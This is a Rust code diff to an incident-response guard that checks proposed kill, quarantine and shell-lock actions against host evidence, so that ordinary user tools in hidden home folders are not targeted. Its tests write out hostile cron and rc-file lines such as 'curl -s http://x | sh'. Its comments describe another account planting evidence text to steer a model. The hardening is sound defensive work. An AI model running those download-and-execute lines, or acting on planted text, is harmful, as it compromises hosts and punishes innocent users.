@@ -330,22 +330,101 @@ pub fn is_genuine_service(comm: &str, exe: &str) -> bool {
     base == comm || base.starts_with(comm) || comm.starts_with(base)
 }
 
+/// A sign on a process that is hard to fake and points at malware: a
+/// kernel-thread name on a real program, a miner marker, or a program run from a
+/// temp directory. A program in a hidden home folder is not one by itself: nvm,
+/// pyenv, bun, `~/.local/bin` and `~/.vscode-server` all live there, and other
+/// accounts on the box put text in the evidence that can steer a model towards a
+/// neighbour's tool.
+fn strong_sign(p: &crate::schema::EvProc) -> bool {
+    p.masquerade || p.miner_hint || is_temp_path(&p.exe)
+}
+
+/// Whose file a persistence entry is: an account's own start-up file or crontab,
+/// or root's (a system file under /etc, root's own start-up files).
+fn persist_owner(p: &crate::schema::EvPersist) -> Option<&str> {
+    if p.path.starts_with("/etc/") {
+        return Some("root");
+    }
+    for spool in ["/var/spool/cron/crontabs/", "/var/spool/cron/"] {
+        if let Some(name) = p.path.strip_prefix(spool)
+            && !name.is_empty()
+            && !name.contains('/')
+        {
+            return Some(name);
+        }
+    }
+    (!p.user.is_empty()).then_some(p.user.as_str())
+}
+
+/// Does `line` name `needle` as a word of its own (`/x/uv` is not named by
+/// `/x/uvx` or `/y/x/uv`)?
+fn mentions(line: &str, needle: &str) -> bool {
+    let part =
+        |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '~' | '$' | '}');
+    line.match_indices(needle).any(|(i, _)| {
+        !line[..i].chars().next_back().is_some_and(part)
+            && !line[i + needle.len()..].chars().next().is_some_and(part)
+    })
+}
+
+/// Is a program in a hidden home folder tied to the incident by something hard
+/// to fake? Its owner runs it disguised or mining, or a flagged start-up, cron or
+/// preload line names it: in the owner's own files (also as `~/…`, `$HOME/…`), or
+/// in root's. Text another account controls cannot make the tie.
+fn tied_to_incident(f: &crate::schema::EvFile, ev: &Evidence) -> bool {
+    let runs_it = ev
+        .processes
+        .iter()
+        .any(|p| p.exe == f.path && p.user == f.owner && (p.masquerade || p.miner_hint));
+    let home = ev
+        .shell_users
+        .iter()
+        .find(|u| u.name == f.owner)
+        .map_or_else(|| format!("/home/{}", f.owner), |u| u.home.clone());
+    let rel = f
+        .path
+        .strip_prefix(home.as_str())
+        .and_then(|r| r.strip_prefix('/'))
+        .filter(|r| !r.is_empty());
+    runs_it
+        || ev.persistence.iter().any(|p| {
+            if !matches!(p.kind.as_str(), "shell_rc" | "cron" | "ld_preload") {
+                return false;
+            }
+            let own = match persist_owner(p) {
+                Some(o) if o == f.owner => true,
+                Some("root") => false,
+                _ => return false,
+            };
+            mentions(&p.line, &f.path)
+                || (own
+                    && rel.is_some_and(|rel| {
+                        ["~/", "$HOME/", "${HOME}/"]
+                            .iter()
+                            .any(|h| mentions(&p.line, &format!("{h}{rel}")))
+                    }))
+        })
+}
+
 /// Is there evidence that this user is the one the incident is about? A login in
 /// the text log is NOT enough (the log can be forged and every administrator logs
-/// in): it takes a process, a dropped program, or a start-up foothold the user's
-/// own account owns.
+/// in): it takes a disguised process, a dropped program, or a start-up foothold
+/// the user's own account owns. A program in their home, even a hidden folder of
+/// it, is how most users keep their own tools, and proves nothing by itself.
 fn implicated(user: &str, ev: &Evidence) -> bool {
     let home_prefix = format!("/home/{user}/");
-    ev.processes.iter().any(|p| {
-        p.user == user
-            && (p.masquerade || p.miner_hint || is_temp_path(&p.exe) || is_home_hidden(&p.exe))
-    }) || ev.persistence.iter().any(|p| {
-        matches!(p.kind.as_str(), "shell_rc" | "cron" | "ld_preload")
-            && (p.user == user || p.path.starts_with(&home_prefix))
-    }) || ev
-        .temp_files
+    ev.processes
         .iter()
-        .any(|f| (f.elf || f.executable) && (f.owner == user || f.path.starts_with(&home_prefix)))
+        .any(|p| p.user == user && strong_sign(p))
+        || ev.persistence.iter().any(|p| {
+            matches!(p.kind.as_str(), "shell_rc" | "cron" | "ld_preload")
+                && (p.user == user || p.path.starts_with(&home_prefix))
+        })
+        || ev
+            .temp_files
+            .iter()
+            .any(|f| (f.elf || f.executable) && f.owner == user && is_temp_path(&f.path))
 }
 
 /// Check one action against the evidence. `Ok(risk)` when it may be offered,
@@ -374,9 +453,7 @@ pub fn ground(a: &Action, ev: &Evidence) -> Result<&'static str, String> {
             // Strong signs only. A deleted executable alone is what every service
             // looks like after a package upgrade, and the heuristic score also
             // flags ordinary programs that live in a hidden directory.
-            let suspicious =
-                p.masquerade || p.miner_hint || is_temp_path(&p.exe) || is_home_hidden(&p.exe);
-            if !suspicious {
+            if !strong_sign(p) {
                 return Err(format!(
                     "kill_process {pid}: tiến trình {} không đủ dấu hiệu độc hại",
                     p.comm
@@ -390,14 +467,10 @@ pub fn ground(a: &Action, ev: &Evidence) -> Result<&'static str, String> {
             }
             // The pattern must be one the evidence actually shows, with the same
             // strong signs a single kill needs.
-            let hit = ev.processes.iter().find(|p| {
-                p.user == *user
-                    && p.exe == *exe
-                    && (p.masquerade
-                        || p.miner_hint
-                        || is_temp_path(&p.exe)
-                        || is_home_hidden(&p.exe))
-            });
+            let hit = ev
+                .processes
+                .iter()
+                .find(|p| p.user == *user && p.exe == *exe && strong_sign(p));
             let Some(p) = hit else {
                 return Err(format!(
                     "kill_matching {user} {}: không có tiến trình đáng ngờ khớp trong bằng chứng",
@@ -437,15 +510,25 @@ pub fn ground(a: &Action, ev: &Evidence) -> Result<&'static str, String> {
             if !plain_path(path) {
                 return Err("quarantine_file: đường dẫn không hợp lệ".into());
             }
-            if !ev.temp_files.iter().any(|f| f.path == *path) {
+            let Some(f) = ev.temp_files.iter().find(|f| f.path == *path) else {
                 return Err(format!(
                     "quarantine_file {}: không có trong bằng chứng",
                     cut(path, 80)
                 ));
-            }
+            };
             if !(is_temp_path(path) || is_home_hidden(path)) {
                 return Err(format!(
                     "quarantine_file {}: ngoài /dev/shm, /tmp, /var/tmp và thư mục ẩn trong /home",
+                    cut(path, 80)
+                ));
+            }
+            // A hidden home folder is where users keep their own tools: such a
+            // file is only taken when the evidence ties it to the incident.
+            if !is_temp_path(path) && !tied_to_incident(f, ev) {
+                return Err(format!(
+                    "quarantine_file {}: chương trình trong thư mục ẩn của tài khoản thường là công cụ \
+                     hợp lệ (nvm, ~/.local/bin, ~/.vscode-server...); chỉ cách ly khi có tiến trình \
+                     giả danh của chủ file chạy nó hoặc một dòng khởi động/cron bị gắn cờ nhắc tới nó",
                     cut(path, 80)
                 ));
             }
@@ -1024,6 +1107,215 @@ mod tests {
                 "{p}"
             );
         }
+    }
+
+    /// bob runs ordinary tools from hidden folders in his home; mallory, another
+    /// account on the box, writes text into the evidence that names them.
+    fn evidence_with_user_tools() -> (Evidence, Vec<&'static str>) {
+        let mut ev = evidence();
+        let tools = vec![
+            "/home/bob/.local/bin/uv",
+            "/home/bob/.vscode-server/code-1a2b3c",
+            "/home/bob/.nvm/versions/node/v20.11.0/bin/node",
+        ];
+        for (i, exe) in tools.iter().enumerate() {
+            ev.processes.push(EvProc {
+                pid: 900 + i32::try_from(i).unwrap(),
+                starttime: 1,
+                user: "bob".into(),
+                comm: exe.rsplit('/').next().unwrap().into(),
+                exe: (*exe).into(),
+                // After an update the running copy shows as deleted.
+                exe_deleted: true,
+                cpu_pct: 99.0,
+                score: 75,
+                out_conns: vec!["140.82.112.3:443".into()],
+                ..EvProc::default()
+            });
+            ev.temp_files.push(EvFile {
+                path: (*exe).into(),
+                owner: "bob".into(),
+                elf: true,
+                executable: true,
+                ..EvFile::default()
+            });
+        }
+        ev.shell_users.push(EvUser {
+            name: "mallory".into(),
+            uid: 1006,
+            home: "/home/mallory".into(),
+            shell: "/bin/bash".into(),
+            admin: false,
+        });
+        // mallory's own flagged lines name bob's tools, in her rc file and crontab.
+        for (path, user) in [
+            ("/home/mallory/.bashrc", "mallory"),
+            ("/var/spool/cron/crontabs/mallory", ""),
+        ] {
+            ev.persistence.push(EvPersist {
+                kind: if user.is_empty() { "cron" } else { "shell_rc" }.into(),
+                path: path.into(),
+                user: user.into(),
+                line_no: 3,
+                line: format!(
+                    "curl -s http://x | sh; {} {} /home/bob/.nvm/versions/node/v20.11.0/bin/node",
+                    tools[0], tools[1]
+                ),
+                sha256: "f00".into(),
+                reason: "downloads from the network".into(),
+            });
+        }
+        // And she runs bob's binary under a kernel-thread name.
+        ev.processes.push(EvProc {
+            pid: 950,
+            starttime: 1,
+            user: "mallory".into(),
+            comm: "[kworker/1:0]".into(),
+            exe: tools[0].into(),
+            masquerade: true,
+            ..EvProc::default()
+        });
+        (ev, tools)
+    }
+
+    #[test]
+    fn ordinary_tools_in_hidden_home_folders_are_not_targets() {
+        let (ev, tools) = evidence_with_user_tools();
+        for (i, exe) in tools.iter().enumerate() {
+            let pid = 900 + i32::try_from(i).unwrap();
+            let e = ground(&Action::KillProcess { pid, starttime: 1 }, &ev).unwrap_err();
+            assert!(e.contains("không đủ dấu hiệu"), "{exe}: {e}");
+            assert!(
+                ground(
+                    &Action::KillMatching {
+                        user: "bob".into(),
+                        exe: (*exe).into()
+                    },
+                    &ev
+                )
+                .is_err(),
+                "{exe}"
+            );
+            let e = ground(
+                &Action::QuarantineFile {
+                    path: (*exe).into(),
+                },
+                &ev,
+            )
+            .unwrap_err();
+            assert!(e.contains("thư mục ẩn"), "{exe}: {e}");
+        }
+        // Nothing ties bob to the incident: his tools are not a foothold.
+        let e = ground(&Action::LockUserShell { user: "bob".into() }, &ev).unwrap_err();
+        assert!(e.contains("không có dấu hiệu"), "{e}");
+        // mallory's disguised process is hers to lose, and her own lines are hers.
+        assert!(
+            ground(
+                &Action::KillProcess {
+                    pid: 950,
+                    starttime: 1
+                },
+                &ev
+            )
+            .is_ok()
+        );
+        assert!(
+            ground(
+                &Action::LockUserShell {
+                    user: "mallory".into()
+                },
+                &ev
+            )
+            .is_ok()
+        );
+    }
+
+    #[test]
+    fn a_hidden_home_program_is_quarantined_when_its_owner_ties_it_to_the_incident() {
+        let q = |p: &str| Action::QuarantineFile { path: p.into() };
+        let uv = "/home/bob/.local/bin/uv";
+
+        // bob's own flagged start-up line runs it, written the way people do.
+        for written in [
+            "nohup ~/.local/bin/uv >/dev/null 2>&1 &",
+            "nohup $HOME/.local/bin/uv &",
+            "nohup \"${HOME}/.local/bin/uv\" &",
+            "nohup /home/bob/.local/bin/uv &",
+        ] {
+            let (mut ev, _) = evidence_with_user_tools();
+            ev.persistence.push(EvPersist {
+                kind: "shell_rc".into(),
+                path: "/home/bob/.profile".into(),
+                user: "bob".into(),
+                line_no: 9,
+                line: written.into(),
+                sha256: "b0b".into(),
+                reason: "starts a detached background program".into(),
+            });
+            assert_eq!(ground(&q(uv), &ev), Ok("low"), "{written}");
+        }
+        // A root-owned system cron file naming it in full.
+        let (mut ev, _) = evidence_with_user_tools();
+        ev.persistence.push(EvPersist {
+            kind: "cron".into(),
+            path: "/etc/cron.d/sync".into(),
+            line: "* * * * * bob /home/bob/.local/bin/uv | sh".into(),
+            ..EvPersist::default()
+        });
+        assert_eq!(ground(&q(uv), &ev), Ok("low"));
+        // bob himself runs it disguised.
+        let (mut ev, _) = evidence_with_user_tools();
+        ev.processes.push(EvProc {
+            pid: 960,
+            starttime: 1,
+            user: "bob".into(),
+            comm: "[kworker/0:2]".into(),
+            exe: uv.into(),
+            masquerade: true,
+            ..EvProc::default()
+        });
+        assert_eq!(ground(&q(uv), &ev), Ok("low"));
+
+        // A longer name, another folder, or `~` in someone else's file is not it.
+        for (path, user, written) in [
+            ("/home/bob/.profile", "bob", "nohup ~/.local/bin/uvx &"),
+            (
+                "/home/bob/.profile",
+                "bob",
+                "nohup /opt/home/bob/.local/bin/uv &",
+            ),
+            ("/home/bob/.profile", "bob", "nohup ~/.local/bin/uv.bak &"),
+            (
+                "/home/mallory/.profile",
+                "mallory",
+                "nohup ~/.local/bin/uv &",
+            ),
+            (
+                "/var/spool/cron/mallory",
+                "",
+                "* * * * * /home/bob/.local/bin/uv",
+            ),
+        ] {
+            let (mut ev, _) = evidence_with_user_tools();
+            ev.persistence.push(EvPersist {
+                kind: if user.is_empty() { "cron" } else { "shell_rc" }.into(),
+                path: path.into(),
+                user: user.into(),
+                line: written.into(),
+                ..EvPersist::default()
+            });
+            assert!(ground(&q(uv), &ev).is_err(), "{path}: {written}");
+        }
+        // An authorized_keys entry is not a line that runs anything.
+        let (mut ev, _) = evidence_with_user_tools();
+        ev.persistence.push(EvPersist {
+            kind: "authorized_keys".into(),
+            path: "/home/bob/.ssh/authorized_keys".into(),
+            user: "bob".into(),
+            line: "command=\"/home/bob/.local/bin/uv\" ssh-ed25519 k".into(),
+            ..EvPersist::default()
+        });
+        assert!(ground(&q(uv), &ev).is_err());
     }
 
     #[test]
